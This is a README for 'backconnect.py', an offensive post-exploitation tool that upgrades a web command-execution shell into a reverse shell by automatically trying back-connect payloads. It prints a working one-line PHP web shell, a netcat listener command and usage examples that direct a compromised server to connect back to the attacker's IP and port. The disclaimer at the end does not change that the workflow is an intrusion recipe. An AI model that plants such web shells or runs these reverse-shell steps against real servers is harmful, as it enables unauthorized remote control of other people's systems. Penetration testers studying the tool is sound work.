# Backconnect

After gaining a command execution shell on a server, this script will help leverage that into a terminal shell using various back connect payloads automatically.

Currently only IPv4 listeners and Linux targets are supported.

##### Example PHP Shell:

The type of shell this script expects is a simple shell such as:
```
<?php system($_GET['cmd']); ?>
```
More complex shells should work as long as they are able to execute system commands via a GET parameter.

## Installation

backconnect.py requires Python3 and the Python Requests package.

`pip install requests`

## Usage
1. Install the command execution shell so it is publicly accessible via a URL.
2. Set up a listener to receive the incoming connection.
	- `nc -nvlp {PORT}`
3. Run this script.

## How to use

```
backconnect.py [-i IP] [-p PORT] [-u URL] [--list] [--view VIEW] [--payloads PAYLOADS]
```
##### -u / --url
This is the URL of the command execution shell, including the necessary injection parameter.

For example, an expected URL parameter would look like the following:

`http://localhost/shell.php?cmd=`

##### -i / --ip
This is the listener IP for the remote server to back-connect to, this is typically your IP address.

##### -p / --port
This is the listener port for the target server to back-connect to.

###### Example:
```
backconnect.py -u http://localhost/cmd.php?cmd= -i 127.0.0.1 -p 1337
```

##### --list
This lists all the available payload types, you can specify these using the *--payloads* argument or view the payload command that is used with the *--view* argument.

`backconnect.py --list`

##### --view
You can specify a payload type and it will show you the payload command that is executed.

`backconnect.py --view {payload_type}`

`backconnect.py --view python_1`

##### --payloads
By default, backconnect.py tests all available payload types. If you know which payload type works for your current target you can specify these individually or in a comma-separated list.

`./backconnect.py -u http://localhost/cmd.php?cmd= -i 127.0.0.1 -p 1337 --payloads python_1,php_1`

`./backconnect.py -u http://localhost/cmd.php?cmd= -i 127.0.0.1 -p 1337 --payloads bash_tcp_1`


## Disclaimer
Usage of this tool for attacking targets without prior mutual consent
is illegal. It is the end user's responsibility to obey all applicable local, state and
federal laws. Developers assume no liability and are not responsible for any misuse or
damage caused by this program
